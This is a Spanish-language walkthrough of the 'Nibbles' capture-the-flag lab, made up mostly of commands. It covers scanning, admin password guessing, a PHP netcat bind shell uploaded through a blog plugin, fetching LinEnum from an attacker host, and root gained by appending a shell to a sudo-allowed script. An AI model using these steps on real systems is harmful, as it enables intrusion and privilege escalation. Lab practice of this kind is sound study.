# Buscamos puertos comunes abiertos
nmap -sV --open -oA nibbles_initial_scan 10.129.42.190

# Buscamos todos los puertos abiertos
nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190

# Banner grabbing mietras se termina lo anterior
nc -nv nibbles_ip 22
nc -nv nibbles_ip 80

# Mas informacion sobre los puertos abiertos
nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190

# Mas informacion usando un script de nmap 
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190 

# Buscar info de la web app que esta corriendo
whatweb 10.129.42.190

# Revisando el codigo fuente de la pagina web se encontro la pagina
10.129.42.190/nibbleblog

# Buscamos directorios posibles en esta pagina
gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt

# Insepeccionamos informacion encontrada
curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -
curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -

# En el primer curl se encontro que hay un usuario "admin" que usamos para entrar a la pagina
# ip_nibbles/admin.php con la contrasena "nibbles" (brute force).

# Una vez dentro, en la pestana de Plugins encontramos el plugin "My Image" mediante el cual podemos
# subir un archivo con el fin de establecer una reverse shell. Utilizamos el archivo "shell.php" con el codigo
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f"); ?>

# Luego, encontramos que "shell.php" se ubica en el directorio (encontramos /content con gobuster)
http://10.129.132.220/nibbleblog/content/private/plugins/my_image

# Ahora ejecutamos la bind shell
curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php/

# Y nos conectamos desde cualquier terminal en el puerto 1234 (porque este especificamos en shell.php)
nc ip_nibble 1234

# Obtenemos una shell tty
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo
fg
ENTER ENTER


## PRIVILEGE SCALATION ##
#
# Nos descargamos el siguiente archivo 
https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Levantamos un server de python para poder descargarlo en la target
python3 -m http.server 
wget http://10.10.14.99:8080/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Encontramos lo siguiente
 [+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

# Lo que significa que podemos ejecutar monitor.sh como root.
# Vamos a crear una bind shell desde ese archivo y ejecutarlo como root
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1235 >/tmp/f" | tee -a /home/nibbler/personal/stuff/monitor.sh
sudo ./monitor.sh

# Finalmente, desde nuestra VM, nos conectamos y obtenemos la root flag
nc nibbles_ip 1235
cat /root/root.txt

# :)

